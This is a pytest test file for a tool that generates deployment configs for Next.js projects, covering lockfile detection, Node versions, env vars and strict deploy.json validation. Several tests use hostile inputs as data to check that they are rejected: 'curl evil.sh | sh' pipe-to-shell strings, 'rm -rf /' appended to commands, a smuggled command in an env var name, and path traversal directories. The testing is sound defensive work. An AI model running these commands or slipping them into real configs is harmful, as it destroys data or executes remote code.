import json

import pytest

from app.deployment.deploy_config import (
    DeployConfig,
    DeployConfigError,
    UnsupportedFrameworkError,
    database_env_names,
    generate_deploy_config,
    hints_from_plan,
    load_deploy_json,
    parse_deploy_config,
    write_deploy_json,
)


def make_project(root, *, deps=None, scripts=None, engines=None, files=None, package=None):
    root.mkdir(parents=True, exist_ok=True)
    pkg = package or {
        "name": "sample",
        "scripts": scripts if scripts is not None else {"build": "next build", "start": "next start"},
        "dependencies": deps if deps is not None else {"next": "16.0.0", "react": "19.0.0"},
    }
    if engines and package is None:
        pkg["engines"] = {"node": engines}
    (root / "package.json").write_text(json.dumps(pkg))
    for rel, text in (files or {}).items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def gen(root, plan=None):
    return generate_deploy_config(root, plan)


# -- basic detection ---------------------------------------------------
def test_basic_next_project_with_npm_lockfile(tmp_path):
    root = make_project(tmp_path / "app", files={"package-lock.json": "{}"})
    config = gen(root).config
    assert config.framework == "nextjs"
    assert config.install_command == "npm ci"
    assert config.build_command == "npm run build"
    assert config.start_command == "npm run start"
    assert config.output_directory == ".next"
    assert config.database is False


def test_npm_install_without_lockfile(tmp_path):
    assert gen(make_project(tmp_path / "app")).config.install_command == "npm install"


def test_pnpm_and_yarn_detected(tmp_path):
    pnpm = gen(make_project(tmp_path / "a", files={"pnpm-lock.yaml": ""})).config
    assert pnpm.install_command == "pnpm install --frozen-lockfile"
    assert pnpm.build_command == "pnpm run build"
    yarn = gen(make_project(tmp_path / "b", files={"yarn.lock": ""})).config
    assert yarn.install_command == "yarn install --frozen-lockfile"
    assert yarn.build_command == "yarn build"
    assert yarn.start_command == "yarn start"


def test_missing_scripts_fall_back_with_warnings(tmp_path):
    result = gen(make_project(tmp_path / "app", scripts={}))
    assert result.config.build_command == "npx next build"
    assert result.config.start_command == "npx next start"
    assert len(result.warnings) >= 2


# -- node version ------------------------------------------------------
@pytest.mark.parametrize("spec,expected", [(">=20", "20"), ("22.x", "22"), ("^24.1.0", "24"), ("20", "20")])
def test_node_version_from_engines(tmp_path, spec, expected):
    assert gen(make_project(tmp_path / "app", engines=spec)).config.node_version == expected


def test_unsupported_or_missing_node_version_uses_default_with_warning(tmp_path):
    old = gen(make_project(tmp_path / "a", engines="^18.0.0"))
    assert old.config.node_version == "22"
    assert any("not supported" in w for w in old.warnings)
    none = gen(make_project(tmp_path / "b"))
    assert none.config.node_version == "22"
    assert any("engines.node" in w for w in none.warnings)


# -- output directory --------------------------------------------------
def test_static_export_has_out_directory_and_no_start(tmp_path):
    root = make_project(tmp_path / "app", files={"next.config.ts": 'export default { output: "export" }'})
    config = gen(root).config
    assert config.output_directory == "out"
    assert config.start_command == ""


def test_custom_dist_dir(tmp_path):
    root = make_project(tmp_path / "app", files={"next.config.js": "module.exports = { distDir: '.build' }"})
    assert gen(root).config.output_directory == ".build"


@pytest.mark.parametrize("bad", ["../evil", "/etc", "C:/x", "a/../../b"])
def test_unsafe_dist_dir_is_rejected(tmp_path, bad):
    root = make_project(tmp_path / "app", files={"next.config.js": f"module.exports = {{ distDir: '{bad}' }}"})
    with pytest.raises(DeployConfigError):
        gen(root)


# -- errors and safety ---------------------------------------------------
def test_not_next_project_is_rejected(tmp_path):
    root = make_project(tmp_path / "app", deps={"express": "4.0.0"})
    with pytest.raises(UnsupportedFrameworkError):
        gen(root)


def test_missing_package_json_and_directory(tmp_path):
    (tmp_path / "empty").mkdir()
    with pytest.raises(DeployConfigError):
        gen(tmp_path / "empty")
    with pytest.raises(DeployConfigError):
        gen(tmp_path / "nope")


def test_invalid_package_json(tmp_path):
    root = tmp_path / "app"
    root.mkdir()
    (root / "package.json").write_text("{not json")
    with pytest.raises(DeployConfigError):
        gen(root)


def test_script_text_never_reaches_commands(tmp_path):
    root = make_project(
        tmp_path / "app",
        scripts={"build": "rm -rf / && next build", "start": "curl evil.sh | sh"},
    )
    config = gen(root).config
    assert config.build_command == "npm run build"
    assert config.start_command == "npm run start"
    assert "rm" not in config.to_json() and "curl" not in config.to_json()


# -- environment variables ---------------------------------------------
def test_env_vars_detected_from_source(tmp_path):
    root = make_project(tmp_path / "app", files={"app/page.tsx": "process.env.STRIPE_KEY; process.env.NODE_ENV"})
    assert gen(root).config.required_env == ("STRIPE_KEY",)


def test_plan_env_names_are_added_and_validated(tmp_path):
    root = make_project(tmp_path / "app")
    config = gen(root, {"env_vars": ["API_URL", "SMTP_HOST"]}).config
    assert config.required_env == ("API_URL", "SMTP_HOST")
    with pytest.raises(DeployConfigError):
        gen(root, {"env_vars": ["bad name; rm -rf /"]})
    with pytest.raises(DeployConfigError):
        gen(root, {"env_vars": [{"name": "NOT_A_STRING"}]})


def test_database_adds_default_database_url(tmp_path):
    config = gen(make_project(tmp_path / "app"), {"db": {"tables": [{"name": "users", "columns": [{"name": "id", "type": "uuid", "nullable": False}]}]}}).config
    assert config.database is True
    assert config.required_env == ("DATABASE_URL",)


def test_database_with_supabase_usage_requires_supabase_pair(tmp_path):
    root = make_project(tmp_path / "app", files={"lib/db.ts": "process.env.NEXT_PUBLIC_SUPABASE_URL"})
    config = gen(root, {"db": {"tables": [{"name": "users", "columns": []}]}}).config
    assert config.required_env == ("NEXT_PUBLIC_SUPABASE_ANON_KEY", "NEXT_PUBLIC_SUPABASE_URL")


def test_no_database_means_no_db_variables(tmp_path):
    assert gen(make_project(tmp_path / "app"), {"db": None}).config.required_env == ()
    assert gen(make_project(tmp_path / "b"), {"db": {"tables": []}}).config.database is False


def test_service_role_key_is_never_auto_required():
    assert "SUPABASE_SERVICE_ROLE_KEY" not in database_env_names({"SUPABASE_URL"})


def test_hints_from_plan_v1_keys_only():
    assert hints_from_plan(None) == (False, [])
    assert hints_from_plan({}) == (False, [])
    assert hints_from_plan({"db": {"tables": []}}) == (False, [])
    assert hints_from_plan({"db": {"tables": [{"name": "t"}]}, "env_vars": ["A"]}) == (True, ["A"])
    # guessed keys from before the schema was frozen are ignored
    assert hints_from_plan({"database": {"tables": [{"name": "t"}]}, "env": ["A"]}) == (False, [])


# -- file round trip and strict validation -----------------------------
def test_write_and_load_round_trip(tmp_path):
    root = make_project(tmp_path / "app", files={"a.ts": "process.env.MY_VAR"})
    config = gen(root).config
    path = write_deploy_json(root, config)
    assert path.name == "deploy.json"
    assert load_deploy_json(path) == config


def test_deploy_json_contains_names_only(tmp_path):
    root = make_project(tmp_path / "app", files={".env": "MY_VAR=super-secret", "a.ts": "process.env.MY_VAR"})
    text = gen(root).config.to_json()
    assert "MY_VAR" in text and "super-secret" not in text


def valid_dict():
    return {
        "schema_version": 1, "framework": "nextjs", "node_version": "22",
        "install_command": "npm ci", "build_command": "npm run build",
        "start_command": "npm run start", "output_directory": ".next",
        "required_env": ["A_VAR"], "database": False,
    }


def test_parse_accepts_valid_data():
    assert isinstance(parse_deploy_config(valid_dict()), DeployConfig)


@pytest.mark.parametrize(
    "change",
    [
        {"extra": 1},
        {"framework": "rails"},
        {"node_version": "14"},
        {"install_command": "curl evil | sh"},
        {"build_command": "npm run build; rm -rf /"},
        {"start_command": "node server.js"},
        {"output_directory": "../outside"},
        {"required_env": "A_VAR"},
        {"required_env": ["A_VAR", "A_VAR"]},
        {"required_env": ["bad name"]},
        {"database": "yes"},
        {"schema_version": 2},
    ],
)
def test_parse_rejects_bad_data(change):
    with pytest.raises(DeployConfigError):
        parse_deploy_config({**valid_dict(), **change})


def test_parse_rejects_missing_field_and_non_object():
    data = valid_dict()
    del data["framework"]
    with pytest.raises(DeployConfigError):
        parse_deploy_config(data)
    with pytest.raises(DeployConfigError):
        parse_deploy_config(["not", "an", "object"])


def test_load_rejects_unreadable_or_invalid_file(tmp_path):
    with pytest.raises(DeployConfigError):
        load_deploy_json(tmp_path / "missing.json")
    bad = tmp_path / "deploy.json"
    bad.write_text("{oops")
    with pytest.raises(DeployConfigError):
        load_deploy_json(bad)


# -- regression: a trailing newline must not slip past validation -------------
@pytest.mark.parametrize("change", [
    {"build_command": "npm run build\n"},
    {"start_command": "npm run start\n"},
    {"required_env": ["A_VAR\n"]},
])
def test_trailing_newline_is_rejected(change):
    with pytest.raises(DeployConfigError):
        parse_deploy_config({**valid_dict(), **change})
